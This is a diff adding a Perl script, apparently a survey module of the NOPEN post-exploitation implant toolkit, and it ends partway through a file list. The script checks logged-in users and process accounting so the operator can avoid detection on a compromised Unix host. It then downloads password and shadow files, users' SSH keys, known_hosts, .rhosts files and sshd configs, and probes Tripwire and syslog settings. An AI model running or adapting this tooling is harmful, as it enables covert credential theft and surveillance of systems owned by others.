@@ -1,0 +1,1834 @@
+#!/usr/bin/env perl
+##
+$VER="1.1.0.13";
+$| = 1 ;
+# Used after exploits, -gs survey surveys things not done by autodone.
+
+myinit() ;
+unless (-s $findfile) {
+  my ($ans) = offerabort(" $findfile\n\nNo find file exists.\n\n".
+	     "Are you sure you want to do a survey yet?\n","N");
+  mydie("Aborted by user") if $ans eq "n";
+}
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid)
+  =  parsestatus();
+
+my ($outputls,$nopenlines,@outputls) =
+nopenlss("-UQ",
+	 "/var/*/*acc*",
+	 "/var/*acc*",
+	);
+my ($outputw,$nopenlines,@outputw) =
+  doit("-w");
+
+# They will check -w and -pacct output above. Based on that they
+# may abort and turn on -b $builtinsonly mode.
+$outputls = join("\n",uniqify_array(@outputls));
+$outputls =~ s,\n\n\n,\n\n,g;
+$outputls = "${COLOR_FAILURE}# NO PACCT FILES MATCHING   /var/*/*acc*   OR   /var/*acc*"
+  unless $outputls;
+$outputw =~ s,\n\n\n,\n\n,g;
+offerabort
+  ($outputw.
+   "# Output from nopenlss(-U,/var/*/*acc*,/var/*acc*):\n".
+   $outputls.
+   "$COLOR_FAILURE\n\n         CHECK THE -w$COLOR_NOTE AND$COLOR_FAILURE pacct LISTING ABOVE (only files are shown)\n\n".
+   "You can abort the survey now if either someone troublesome is logged\n".
+   "in or the -pacct above shows a process accounting issue.",
+  );
+
+#chomp($partsdonesofar =
+#      `cd $optmp ; ls -alrt .survey*done.$nopen_rhostname 2>/dev/null| awk '{print \$8,\$9}'`."\n");
+if ($partsdonesofar) {
+  my $countdone = scalar split(/\n/,$partsdonesofar);
+  my $more = 
+    "$COLOR_NORMAL\n".
+    "The survey sections above have been done previously this op.\n".
+    "You will have the opportunity to repeat them, but the default\n".
+    "for the sections above will be to <S>kip them.\n\n";
+    "op. To re-do them, <A>bort now and re-run $prog with the -O option";
+  $more = 
+    "$COLOR_NORMAL\n".
+    "The survey sections above have been done previously this op.\n".
+    "You used -O (do-Over), so you will have the opportunity to repeat\n".
+    "(or <S>kip) them as desired.\n\n"
+      if $doover;
+  if ($nopauses) {
+    # The extra color-normal in here is to split up the "NL" string, which 
+    # sub dolocalecho will replace with a newline.
+    $more = 
+      "$COLOR_NORMAL\n".
+      "Note that the survey sections above have been done previously this op.\n".
+      "If you continue now, ON${COLOR_NORMAL}LY those section(s) not yet done will be done.\n".
+      "If you want the chance to repeat some sections, <A>bort now run $prog\n".
+      "without the -Y option. To repeat ALL without any prompts, use both -Y\n".
+      "and -O.";
+    $more = 
+      "$COLOR_NORMAL\n".
+      "Note that the survey sections above have been done previously this op.\n".
+      "If you continue now, ALL of them will be repeated with no pause or chance\n".
+      "to abort in between (since you used -Y/nopause). To choose which to re-do,\n".
+      "<A>bort now and remove the -Y option."
+	if ($doover);
+    $more = "\n\n".
+      "ALL sections will be repeated, without pause and without the ability to abort\n".
+      "in between. (Abort now and remove -Y option, and you'll have the chance to\n".
+      "<S>kip some surveys or <A>bort between them.)\n\n"
+      if ($doover and $countdone == scalar @surveytypes);
+  }
+  offerabort
+    (
+     $COLOR_NOTE.
+     "Survey sections are: @surveytypes\n\n".
+     $COLOR_FAILURE.
+     $partsdonesofar.
+     $more
+    );
+}
+
+
+unless ($builtinsonly) {
+  doit("w");
+  offerabort
+    ("The unix w above may differ from the -w.\n".
+     "If it's bad enough, you should$COLOR_FAILURE <A>bort$COLOR_NORMAL now.\n\n".
+     "Last chance to abort before using more remote unix commands."
+    );
+}
+my $popupoffset = 10;
+my $donecount = 0;
+my $firsttime = 0;
+my $surveysdone = "";
+my $aborting = 0;
+my $extraoutput = "";
+my $timelastcmd = time();
+my @logfilestailed = ();
+
+
+# These now in gsgets
+# Now using mydo(gettail) after sett#ing @ARGV to our -logcheck arguments.
+#mydo("gettail","-l","-250",
+#     "/var/adm/syslog",
+#     "/var/adm/messages",
+#     "/var/log/syslog",
+#     "/var/log/messages",
+#    );
+
+while (1) {
+  foreach my $surveytype (@surveytypes) {
+    $surveysdone .= "\t$surveytype\n"
+      if skipordo($surveytype);
+    last if $aborting;
+  }
+  last if $donecount or $aborting;
+  my ($ans,$longans) = mygetinput
+    ($COLOR_NOTE.
+     "Sections include: @surveytypes\n\n".
+     $COLOR_FAILURE.
+     $partsdonesofar.
+     $COLOR_NORMAL.
+     "Above files in $optmp indicate when the survey components were done\n".
+     "previously during this op, so no parts of the survey were done. You can\n".
+     "use the -O option later to re-do all or some portions of the survey, or\n".
+     "answer \"RE-DO\" now to do so. (Default will be to <S>kip them, change\n".
+     "that to <C>ontinue for those you wish to repeat.)\n\n".
+     "Exit or RE-DO?","Exit","RE-DO"
+    );
+  last if $ans eq "e";
+
+  # Throw away this extra output, will not apply since we
+  # skipped ALL and may now re-do some.
+  $extraoutput = "";
+
+  $donecount++; # If they skip em all again, no need to stay in here
+  foreach my $key (keys %skip) {
+    delete $skip{$key};
+  }
+}
+$surveysdone = "\tNONE" unless $surveysdone;
+chomp($partsdonesofar =
+      `cd $optmp ; ls -alrt .survey*done.$nopen_rhostname 2>/dev/null| awk '{print \$8,\$9}'`."\n");
+$partsdonesofar =~ s/\n/\n\t/g;
+progprint("$COLOR_FAILURE  SURVEY FINISHED\n\n".
+	  "Completed this pass:\n$surveysdone\n\n".
+	  "Completed this op:\n\t$partsdonesofar".
+	 "");
+## END MAIN ##
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  do $autoutils;
+  $prog = "-gs survey";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $linuxtarget = $nopen_serverinfo =~ /linux/i
+    unless $linuxtarget;
+
+  ($solaristarget,$junk,$solaristargetversion)
+    = $nopen_serverinfo =~ /((sunos|solaris)\s*([\d\.]*))/i;
+  # Use the 2.* nomenclature for solaris, to match
+  # what our tarball VERSION files use.
+  $solaristargetversion =~ s/^5/2/g;
+
+  $inteltarget = $nopen_serverinfo =~ /[i3456x]+86/;
+
+  ($sparctarget) = $nopen_serverinfo =~ /((sparc|sun4[umc])\S*)/;
+
+  $sol10target = $nopen_serverinfo =~ /5.10/i
+    unless $sol10target;
+
+  $aixtarget = $nopen_serverinfo =~ /aix/i
+    unless $aixtarget;
+
+  $findfile = "$opdown/cmdout/$nopen_rhostname-find";
+
+  @nonbuiltins = ("egrep",
+		  "find",
+		  "netstat",
+                  "oslevel",
+                  "lslpp",
+                  "genkex",
+                  "lscfg",
+                  "lsattr",
+                  "bootinfo",
+                  "prtconf",
+                  "ksyms",
+                  "eeprom",
+                  "isainfo",
+                  "isalist",
+                  "pkginfo",
+                  "psrinfo",
+                  "showrev",
+		  "nslookup",
+		 );
+  @surveytypes = ("gets",
+		  "ls",
+		  "ssh",
+		  "spooftest",
+		  "tripwire",
+		  "rootkit",
+		  "ident",
+		  "dns",
+                  "hardware",
+		  "checksyslogs",
+		  "histories",
+		 );
+  %surveysalreadydone = ();
+  if (chomp($partsdonesofar =
+	    `cd $optmp ; ls -alrt .survey*done.$nopen_rhostname 2>/dev/null| awk '{print \$8,\$9}'`."\n")) {
+    my @lines = split(/\n/,$partsdonesofar);
+    foreach (@lines) {
+      $surveysalreadydone{$1}++
+	if /\.survey\.(\S+)done/;
+    }
+  }
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=survey\" is used.
+
+";
+  # -p is now just ignored, but allow it anyway
+  $getoptsletters = "hvdbYOpT:Ff";
+  $gsusagetext="
+Usage: $prog
+
+$prog surveys a remote unix host via NOPEN. This interactive version
+replaced the old script c. Dec 2008. Unless -O is used, $prog will not
+repeat sections of the survey done previously during this op on this host.
+
+Default mode uses some NON BUILTINS (target binaries, varies by platform):$COLOR_FAILURE\n  ";
+  my $width = 3;
+  foreach (@nonbuiltins) {
+    $width += length($_) + 1;
+    if ($width > 78) {
+      $width = 3;
+      $gsusagetext .= "\n  ";
+    }
+    $gsusagetext .= " $_";
+  }
+  $gsusagetext .= "$COLOR_NORMAL
+
+OPTIONS
+  -h        Show this help (this is default without the -p option)
+  -v        Show version
+  -b        Perform ONLY NOPEN built-ins (e.g., if process accounting)
+  -Y        Skip any informational pauses. You will still be prompted
+            if something urgent shows up.
+  -F        Force prompts for ALL collects (default is automatic downloads for
+            all but hardware section, i.e. /boot on Linux)
+  -f        Force hardware section download also (i.e., /boot on Linux)
+  -T max    Max collect, in Megs, on wire (-gs bwsofar) to allow  [default 50M]
+  -O        Repeat (do Over) the sections previously completed\n";
+  foreach my $type (@surveytypes) {
+    my $name = uc $type;
+    my $index=0;
+    while (1) {
+      $ltr = uc substr($type,$index,1);
+      last unless ($getoptsletters =~ /$ltr/);
+      $index++;
+      if ($index >= length($type)) {
+	my $index2 = 0;
+	my $ltrs =
+	  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+	while (1) {
+	  $ltr = substr($ltrs,$index2++,1);
+	  next if ($getoptsletters =~ /$ltr/);
+	  mydie("TOO MANY OPTIONS, \@surveytypes is too big")
+	    if $index2 >= length($ltrs);
+	  last;
+	}
+	last;
+      }
+    }
+    $getoptsletters .= $ltr;
+    $gsusagetext .= "  -$ltr        Skip the $name section\n";
+  }
+  $gsusagetext .= "
+Usage: $prog
+
+";
+#mydie("ARGV=(@ARGV) h=$opt_h v=$opt_v d=$opt_d b=$opt_b p=$opt_p x=$opt_x");
+  mydie("bad option(s)") if (! Getopts( $getoptsletters ) ) ;
+  $maxbw = $opt_T;
+  $maxbw = 50 unless $maxbw;
+  $forcepull =  $opt_F ? "" : "Y";
+  $forcepull2 = ($forcepull and $opt_f) ? "Y" : "";
+  mydie("-T $maxbw must be a positive integer")
+    unless ($maxbw > 0 and $maxbw == int($maxbw));
+  my $bwsofar = (bwsofar())[0];
+  if ($bwsofar >= $maxbw) {
+      my $more = int(2 * $bwsofar);
+      my $default = "DEFAULT " if ($maxbw == 50);
+      offerabort($COLOR_FAILURE."\n\n${default}BANDWIDTH LIMIT (${maxbw}M) exceeded (so far this op, bw = ${bwsofar}M)\n".
+		 $COLOR_NORMAL."\n\n".
+		 "If you continue, some of the automatic pulls =survey usually does will not\n".
+		 "be done. If you abort and use the option -T$more, =survey will pull them.".
+		 "",
+		 "ABORT");
+		 
+  }
+#  mydie("bad option(s)") if (! getopts( "hvdbp" ) ) ;
+  foreach my $type (@surveytypes) {
+    my ($ltr) = $type =~ /^(.)/;
+    $ltr = uc $ltr;
+    my $optstr = "opt_$ltr";
+    $skip{$type} = eval $$optstr;
+  }
+  $doover = $opt_O;
+  unless ($doover) {
+    foreach my $type (@surveytypes) {
+      $skip{$type}++ if -s "$optmp/.survey.${type}done.$nopen_rhostname";
+    }
+  }
+  $nopauses = $opt_Y;
+  # No longer requiring -p, just ignore it though.
+#  $opt_h++ unless $opt_p;
+  $builtinsonly = $opt_b;
+  ($minus,$caret,$skipping,$notbuiltincomment) = ("","^","","# BUILTIN NOT USED HERE BY DEFAULT");
+  if ($builtinsonly) {
+    $minus = "-";
+    $caret = "";
+    $skipping = "# SKIPPING in -b BUILTIN ONLY MODE: ";
+    $notbuiltincomment = "";
+  }
+  $debug = $opt_d ;
+  usage() if ($opt_h or $opt_v) ;
+
+  $socket = pilotstart(quiet);
+  $COLOR_MYYELLOW = "\033[3;43m";
+  $COLOR_MYGREEN = "\033[3;42m";
+  $COLOR_MYRED="\033[31;07m";   # This one is  grey  font red background
+  $COLOR_MYRED = "\033[33;41m"; # This one is yellow font red background
+  $REGEXP_NOTE = $COLOR_NOTE;
+  $REGEXP_MYRED = $COLOR_MYRED;
+  $REGEXP_MYGREEN = $COLOR_MYGREEN;
+  $REGEXP_MYYELLOW = $COLOR_MYYELLOW;
+  $REGEXP_NOTE =~ s,\[,\\\[,g;
+  $REGEXP_MYRED =~ s,\[,\\\[,g;
+  $REGEXP_MYGREEN =~ s,\[,\\\[,g;
+  $REGEXP_MYYELLOW =~ s,\[,\\\[,g;
+
+}
+#myinit
+
+sub gsspooftest {
+    # autospooftest was written to stand alone, just call it with defaults.
+    dbg("Calling    mydo(autospooftest);");
+    mydo("autospooftest");
+}
+#gsspooftest
+
+sub gsssh {
+  #dbg("Calling:  my ($userlist,@userdirs) = parseuserdirs($nopen_rhostname,2000,the gsssh() survey);");
+  my ($userlist,@userdirs) = parseuserdirs($nopen_rhostname,2000,"the gsssh() survey");
+  #dbg("got ($userlist,@userdirs) from parseuserdirs()");
+  unless (@userdirs) {
+    offerabort
+      ("$COLOR_FAILURE\n".
+       "No list of remote users....has the \"-gs auto\" (a.k.a. autodone) been\n".
+       "done yet? If not, you may want to abort here then re-run -gs survey\n".
+       "once autodone has completed.".
+       "");
+  }
+  my @getfiles = ();
+  my $maxsize = 262144;
+  foreach my $dir (@userdirs) {
+    push(@getfiles,
+	 "$dir/.ssh*",
+	 "$dir/.rhosts",
+	 "$dir/.shosts",
+	);
+  }
+  push(@getfiles,
+       "/etc/ssh",
+       "/etc/sshd",
+       "/usr/local/etc/ssh",
+       "/usr/local/etc/sshd",
+# TODO: "/path/to/more/keys/fun",
+      );
+    nopenlss("-GYFM100000",
+		"/usr/local/cpanel/version",
+		"/etc/hostname",
+		"/etc/hosts*",
+		"/etc/inet/hosts*",
+		"/etc/*syslog*.conf",
+		"/etc/*/*syslog*.conf",
+		"/etc/inetd.conf",
+		"/etc/inet/inetd.conf",
+		"/etc/resolv.conf",
+		"/etc/passwd*",
+		"/etc/shadow*",
+		"/etc/master.passwd*",
+		"/etc/security/passwd*",
+	       ) unless ($freebsdtarget);
+
+
+  #nopengetfiles("SIZEMAX=$maxsize",@getfiles);
+  nopenlss("-${forcepull}GM$maxsize",@getfiles);
+  progprint(".\n\n\n".
+	    "Done pulling all files of at most $maxsize bytes, recursively,\n".
+	    "from the following locations (for all users ~ in the passwd file):\n\n".
+	    "    ~/.ssh\n".
+	    "    ~/.rhosts\n".
+	    "    ~/.shosts\n".
+	    "    /etc/ssh\n".
+	    "    /etc/sshd\n".
+	    "    /usr/local/etc/ssh\n".
+	    "    /usr/local/etc/sshd\n".
+	    "\n".
+	    "List of paths and their users:\n\n".
+	    $userlist.
+	    "");
+  offerabort(
+"  # TODO: Maybe add logic in the gsssh() section to also pull (unless already \n".
+"  # pulled) any ssh files in the -find that look good....  id_* ident key etc.\n".
+"",
+	     "C") unless $nopauses;
+}
+#gsssh
+
+sub gssshbad {
+  # This was the old autossh content. Not used here at all.
+
+  my $ignorefind = 0;
+  my $useboth=0;
+  #  $ignorefind=1;
+  my $showatime = 0;
+  my $showctime = 0;
+  my $showmtime = 1;
+  my $showswhat = "";
+  my $first = "";
+  if ($showmtime) {
+    $showswhat .= "/mtime";
+    $first = "mtime" if (!$first);
+  }
+  if ($showatime) {
+    $showswhat .= "/atime";
+    $first = "atime" unless $first;
+  }
+  if ($showctime) {
+    $showswhat .= "/ctime";
+    $first = "ctime" unless $first;
+  }
+  $showswhat =~ s/^.// ;
+  my $lsargs = "-".substr($first,0,1);
+  $lsargs =~ s/a/u/ ;
+  $lsargs = "" if ($lsargs eq "-m") ;
+  unless ($showswhat =~ /\//) {
+    $showswhat = "and sorted by $showswhat";
+  } else {
+    $showswhat .= " (sorted by $first)";
+  }
+  my $forceredo = 0;
+  my $sshoutfile = "$optmp/.sshout.$nopen_rhostname";
+  my $sshoutsortedfile = "$optmp/.sshout.sorted.$nopen_rhostname";
+  unlink ("$optmp/.autosshdonegot.$nopen_rhostname",
+	  "$optmp/.autosshdonelist.$nopen_rhostname",
+	  "$optmp/.autosshdonegrep.$nopen_rhostname",
+	  $sshoutfile,
+	  $sshoutsortedfile,
+	 ) if ($forceredo and !$debug);
+  my $gotbefore = -e "$optmp/.autosshdonegot.$nopen_rhostname";
+  my $listedbefore = -e "$optmp/.autosshdonelist.$nopen_rhostname";
+  my $greppedbefore = -e "$optmp/.autosshdonegrep.$nopen_rhostname";
+  my $skipgets = 0;
+  mydie("Use -f to redo $prog on $nopen_rhostname")
+    if ($skipgets and $listedbefore);
+  my $skipthese = 0;
+  my $nosnapshot = 1;
+  my $pause = "# ";
+  #  $pause = "-pause" unless $opt_p;
+  my $popups = 0 ;
+  my (@dodirs,%dodirs) = () ;
+  unlink("$optmp/.sshout","$optmp/.sshout.sorted");
+  my $hardhomedirs = " /.*ssh* /root/.*ssh* /home/*/.*ssh* /*ssh* /root/*ssh* /home/*/*ssh* /usr/home/*/*ssh* /usr/home/*/.*ssh* /export/home/*/*ssh* /export/home/*/.*ssh* " ;
+  $hardhomedirsonly = " / /root /home/* /*/home/*" ;
+  my $defhomedirs = $hardhomedirsonly;
+  #  foreach $tmpdir (split(/\s+/,$defhomedirs)) {
+  #    $dodirs{$tmpdir}++ ;
+  #  }
+  my $usefind = (!$ignorefind and -s "$opdir/$nopen_rhostname.find.SSH" and -r _) ;
+  if ($usefind) {
+    # Do this only if we are using the -find file.
+    if (-d "$opdown/$nopen_rhostname") {
+      progprint("Looking in $opdown/$nopen_rhostname for passwd files.");
+      my @passwdfiles = split(/\n/,`find $opdown/$nopen_rhostname 2>/dev/null| grep passwd`);
+      my %donesums = () ;
+      progprint("Parsing passwd files found (@passwdfiles).");
+      foreach $passfile (@passwdfiles) {
+	chomp(my $sum = `sum $passfile`) ;
+	next if ($sum and $donesums{$sum}++) ;
+	if (open(IN2,"< $passfile")) {
+	  while (<IN2>) {
+	    next if /^\#/ ; 	 # skip comments
+	    split (/:/) ;
+	    next unless ($_[5] =~ /^\//) ; # ignore if not path
+	    $dodirs{dirname($_[5])."/*"}++ ;
+	  }
+	  close(IN2);
+	}
+      }#foreach $passfile
+    }#if -d "$opdown/$nopen_rhostname")
+  }#Look for passwd files or not?
+  @dodirs = keys (%dodirs) ;
+  # Defaults
+  # How long to retrieve in bytes
+  my $defmaxlength = 100000 ;
+  # How many to popup
+  my $defmaxviewed = 10 ;
+  # look where for ssh files
+  my $homedirfile = "$opetc/.homedirs.$nopen_rhostname" ;
+  if (! -e "$homedirfile") {
+    if (open(OUT2,"> $homedirfile")) {
+      print OUT2 "@dodirs\n";
+      close(OUT2);
+    } else {
+      mydie("Unable to open > $homedirfile");
+    }
+  }
+  mydie("Unable to open < $homedirfile") unless (open(IN2,"< $homedirfile")) ;
+  chomp($homedirs = <IN2>) ;
+  close(IN2) ;
+  foreach $tmpdir (split(/\s+/,$homedirs)) {
+    $dodirs{$tmpdir}++ ;
+  }
+  @dodirs = keys (%dodirs) ;
+  my $homedirs = " " ;
+  my $homedirsonly = " " ;
+  foreach (@dodirs) {
+    $homedirs .= "$_/.*ssh " unless (/^\/dev/ or "$hardhomedirs$homedirs" =~ / $_\/.*ssh /) ;
+    $homedirsonly .= "$_ " unless (/^\/dev/ or "$hardhomedirsonly$homedirsonly" =~ / $_ /) ;
+  }
+  $homedirs =~ s/\s+/ /g ;
+  $homedirs =~ s/^\s*(.*)\s*$/\1/g ;
+  $homedirs =~ s/\/+/\//g ;
+  $homedirsonly =~ s/\s+/ /g ;
+  $homedirsonly =~ s/^\s*(.*)\s*$/\1/g ;
+  $homedirsonly =~ s/\/+/\//g ;
+  if (open(OUT2,"> $homedirfile")) {
+    print OUT2 "$homedirsonly\n";
+    close(OUT2);
+  } else {
+    mydie("Unable to open > $homedirfile second time");
+  }
+  
+  
+  my $maxlength = $defmaxlength ;
+  my $maxviewed = $defmaxviewed ;
+  my $sshfindfile = "" ;
+  if ($ignorefind) {
+    progprint("Ignoring $nopen_rhostname-find if it is there, using -ls mode instead.");
+  } elsif (my $size = -s "$opdir/$nopen_rhostname.find.SSH" and -r _) {
+    $sshfindfile = "$opdir/$nopen_rhostname.find.SSH";
+    progprint("\n\n\nFound -find.SSH output: $sshfindfile\n\n");
+    progprint("It is $size bytes, searching it may take a while.\n\n")
+      if ($size > 30000000);
+    # Skip NULL pass unless we need to run the -ls commands
+    #    $pass = 2 unless $useboth;
+    # Side effect of this next line is making the .sshout.sorted file.
+    # @allsshfiles we're not actually using.
+    my @allsshfiles = split(/\n/,`grep "\/.*ssh" $sshfindfile | lss -S | tee $sshoutsortedfile | cut -c 14-999`);
+    `touch $optmp/.autosshdonegrep.$nopen_rhostname`;
+    `touch $optmp/.autosshdonelist.$nopen_rhostname`;
+    #    @knownhosts = map { s/[^\/]*\//\// } (grep { /\/.*known.*hosts/ } @allsshfiles);
+    #    @binssh = map { s/[^\/]*\//\// } (grep { /\/.*bin.*ssh/ } @allsshfiles);
+  } else {
+    progprint("We need to list out their ssh files");
+  }
+
+  if (				#!$useoldfiles and 
+      !$listedbefore and
+      (!$sshfindfile or $useboth)) {
+    # so either we do not have a *-find or they want to look both on target
+    # with -ls and in the *-find.
+    # TODO: Maybe if we save the .sshout files per host, and it's newer than the
+    # ??? we can reuse old ones? Maybe for -find?
+    progprint("\n\n\nThis can take a while on a large file system.\n\n\n",
+	      $COLOR_FAILURE);
+    `echo -e "\n\n# BREAK\n\n" >> $sshoutsortedfile`;
+    my $perline = 3;
+    my $nextone = "";
+    foreach (split(/\s+/,"$hardhomedirs $homedirs")) {
+      $perline--;
+      $nextone .= " $_";
+      if ($perline == 0) {
+	push(@targdirs,$nextone);
+	$nextone = "";
+	$perline = 3;
+      }
+    }
+    push(@targdirs,$nextone) if $nextone;
+    for $targdir (@targdirs) {
+      doit("-ls $lsargs -i $targdir >> L:$sshoutfile");
+    }
+    open(IN,"cat $sshoutfile | lss -s | lss -S | tee $sshoutsortedfile |")
+      or mydie("Cannot open pipe:\n".
+	       " cat $sshoutfile | lss -s | lss -S | tee $sshoutsortedfile |");
+    `touch $optmp/.autosshdonelist.$nopen_rhostname`;
+  } else {
+    mydie("Cannot open $sshoutsortedfile for read")
+      unless open(IN,"< $sshoutsortedfile");
+  }
+  unless ($skipgets) {
+    $afterbreak = 0 ;
+    mydie("cannot open $optmp/.sshlater for write: $!")
+      unless (open(LATER,"> $optmp/.sshlater"));
+    while (<IN>) {
+      next if ($nosnapshot and /\.snapshot/) ;
+      next if ($skipthese and /$skipthese/);
+      if (/^. BREAK$/) {
+	$afterbreak++;
+	next;
+      }
+      ($stamp,$inode,$type,$length) = /(\d{4}\d+)\s*:\s*(\d+)\s*(.)\S*\s*\S*\s*\S*\s*\S*\s*(\d*)/ ;
+      next unless $type eq "-" ; # skip links/dirs/etc
+      #dbg($_);
+      my ($year,$mon,$mday,$hr,$min) = $stamp =~ /(\d{4})(\d\d)(\d\d)(\d\d)(\d\d)/ ;
+      my ($stamp,$inode,$stuff,$mtime,$atime,$ctime,$file) = () ;
+      if ($sshfindfile and !$afterbreak) {
+	($stamp,$inode,$stuff,$mtime,$atime,$ctime,$file) =
+	  /(\d{4}\d+):\s*(\d+)\s*([^\|]*)\s*\|\s*([^\|]*)\s*\|\s*([^\|]*)\s*\|\s*([^\|]*)\s*\|\s*[^\/]*(\/.*)/ ;
+      } else {
+	($stamp,$inode,$stuff,$file) =
+	  /(\d{4}\d+):\s*(\d+)\s*([^\/]*)\s*(\/.*)/ ;
+      }
+      my $times= "";
+      unless ($afterbreak) {
+	if ($mtime or $atime or $ctime) {
+	  $times .= "|m $mtime" unless (!$showmtime and ($showatime or $showctime));
+	  $times .= "|a $atime" if $showatime;
+	  $times .= "|c $ctime" if $showctime;
+	}
+	$times =~ s/^\|[mac] // unless
+	  $times =~ /\|[ma] .*\|[ac] / ;
+      }
+      print LATER "$stuff$times $file\n";
+      #      push(@binssh,$_) if ($file =~ /\/.*bin.*ssh/ ) ;
+      if ($file =~ /\/.*known.*hosts/) {
+	$length{$file} = $length;
+	push(@knownhosts,$file) ;
+      } elsif ($file =~ /\/.*authorized.*keys/) {
+	$length{$file} = $length;
+	push(@authkeys,$file) ;
+      } elsif ($file =~ /\/.*identity/) {
+	$length{$file} = $length;
+	push(@identities,$file) ;
+      }
+    }
+    my $counthosts = @knownhosts;
+    my $countkeys = @authkeys;
+    my $countids = @identities;
+    my $max = maxof($counthosts,$countkeys,$countids);
+    my $ans = -1;
+    while ($max > 20 and ($ans < 0 or $ans =~ /\D/)) {
+    #      $ans = getinput("
+      ($shortans,$ans) = mygetinput("
+That's a lot of files!
+
+File Type         Count
+
+known.*hosts      $counthosts
+authorized.*keys  $countkeys
+identity          $countids
+
+Enter maximum count (of any one type) to get: [$max] ");
+      $ans = $max unless $ans;
+      if ($ans < $max) {
+	shift @knownhosts while @knownhosts > $ans;
+	shift @authkeys while @authkeys > $ans;
+	shift @identities while @identities > $ans;
+	$max=0; # drop out of while
+      }
+    }
+    close(IN);
+    close(LATER);
+  }
+  my @moreout = () ;
+  my $v = "" ;
+  $v = " -v" if $popups;		# pop up window when getting first several
+  my $numviewed = 0;
+  my $multiplefiles = "" ;
+  @dowhich = (@knownhosts,@authkeys,@identities);
+  if ($gotbefore) {
+    mywarn("Skipping these -gets, done before:\n@dowhich") if @dowhich;
+  } else {
+    foreach $file (@dowhich) {
+      if ($maxlength and $length{$file} > $maxlength) {
+	progprint("Skipping $file (too long): maxlength is $maxlength");
+	next ;
+      }
+      if ($popups and $v and ($maxviewed <= $numviewed)) {
+	progprint("Only popping up first $maxviewed windows...just downloading the rest",$COLOR_FAILURE);
+	doit("-get -q$v $multiplefiles") if (length $multiplefiles);
+	#	push(@moreout,"-get -q$v $multiplefiles") if (length $multiplefiles);
+	$multiplefiles = "";
+	$v = "" ;
+      }
+      unless ($skipgets or $gotfile{$file}++) {
+	$numviewed++ ;
+	$multiplefiles .= " $file" ;
+	if (length $multiplefiles > 512) {
+	  #	  push(@moreout,"-get -q$v $multiplefiles") ;
+	  doit("-get -q$v $multiplefiles") ;
+	  $multiplefiles = "";
+	}
+	#	push(@moreout,"$pause Just got $file") ;
+      }
+    }
+    doit("-get -q$v $multiplefiles") 
+      if (length $multiplefiles);
+  }
+  #  if (@moreout) {
+  #    doit("$pause Below is the sorted list of ssh files in $homedirs",);
+  #    my $more = " (and popping up)" if $popups ;
+  #    progprint("# Pulling$more known.*hosts and other config files");
+  #    doit(@moreout);
+  #  } else {
+  #    progprint("Above${COLOR_NORMAL} is the sorted list of ssh files in $homedirs,\n".
+  #	      "${COLOR_FAILURE}BUT NONE WERE known.*hosts files",
+  #	      $COLOR_FAILURE);
+  #  }
+  # only get these if not gotten before
+  if (-e "$optmp/.autosshdone.$nopen_rhostname") {
+    mywarn("Skipping the ssh* and .ssh* -gets, done before");
+  } else {
+    `touch $optmp/.autosshdonegot.$nopen_rhostname`;
+    foreach ("/etc","","/root",
+	     #"/usr/local/etc","/usr/local"
+	    ) {
+      if (1) {
+	#nopengetfiles("SIZEMAX=200000",
+	nopenlss("-YGM200000",
+	   "$_/ssh*",
+	   "$_/.ssh*");
+      } else {
+	#dbg("-get -q $_/ssh*");
+	#dbg("-get -q $_/.ssh*");
+      }
+    }
+  }
+  foreach $path ("/usr/bin","/usr/sbin","/usr/local/bin") {
+    doit("-sha1sum $path/ssh*");
+  }
+  my $fromwhere = "from ";
+  $fromwhere .= " both " if ($usefind and $useboth);
+  $fromwhere .= "the $nopen_rhostname-find file" unless !$usefind;
+  $fromwhere .= " and " if ($usefind and $useboth);
+  $fromwhere .= "remote -ls commands" if (!$usefind or $useboth);
+  ($sshversion,$nopenlines,@output) = doit("ssh -V") unless $builtinsonly;
+  ($output,$nopenlines,@output) = doit("sshd -V") unless $builtinsonly;
+  foreach (@output) {
+    next if /illegal option/i;
+    last if /usage/i;
+    $sshdversion.=$_;
+  }
+  if (my $listing = `lss $optmp/.sshlater 2>/dev/null`) {
+    progprint("\n\nListing of ssh files on target showing $showswhat.\n\n\n".
+	      $listing.
+	      "\n\nAbove is the sorted list of ssh files in:\n ".
+	      "$COLOR_FAILURE$hardhomedirs $homedirs\n$COLOR_NORMAL".
+	      "$fromwhere.",
+	      $COLOR_NORMAL);
+  } else {
+    mywarn("PROBLEM: $optmp/.sshlater should not be empty");
+  }
+
+}
+#END gsssh
+
+sub gstripwire {
+  #nopengetfiles("SIZEMAX=200000",
+  nopenlss("-${forcepull}GYM200000",
+		"/etc/twcfg.txt",
+		"/etc/tw.config",
+		"/etc/twpol.txt",
+		"/opt/*/twcfg.txt",
+		"/opt/*/tw.config",
+		"/opt/*/twpol.txt",
+		"/usr/etc/twcfg.txt",
+		"/usr/etc/tw.config",
+		"/usr/etc/twpol.txt",
+		"/usr/local/etc/twcfg.txt",
+		"/usr/local/etc/tw.config",
+		"/usr/local/etc/twpol.txt",
+		"/usr/TSS/bin/twcfg.txt",
+		"/usr/TSS/policy/twpol.txt",
+	       );
+  nopenlss("-QU",
+	   "/opt/*/lib/tw.db*",
+	   "/opt/*/tw.db*",
+	   "/tmp/twz*",
+	   "/usr/lib/tw.db*",
+	   "/var/lib/tripwire*",
+	   "/usr/local/*bin/sig*",
+	   "/usr/local/*bin/trip*",
+	   "/usr/local/*bin/twadmin*",
+	   "/usr/local/trip*",
+	   "/usr/local/etc/trip*",
+	   "/usr/local/tw*",
+	   "/usr/local/etc/tw*",
+	   "/usr/local/*bin/twprint*",
+	   "/usr/local/lib/tw.db*",
+	   "/usr/local/man/*4*/tw*",
+	   "/usr/local/man/5*/twfiles*",
+	   "/usr/local/man/*8*/trip*",
+	   "/usr/man/*4*/tw*",
+	   "/usr/man/5*/twfiles*",
+	   "/usr/man/*8*/trip*",
+	   "/usr/man/*8*/tw*",
+	   "/usr/share/man/*4*/tw*",
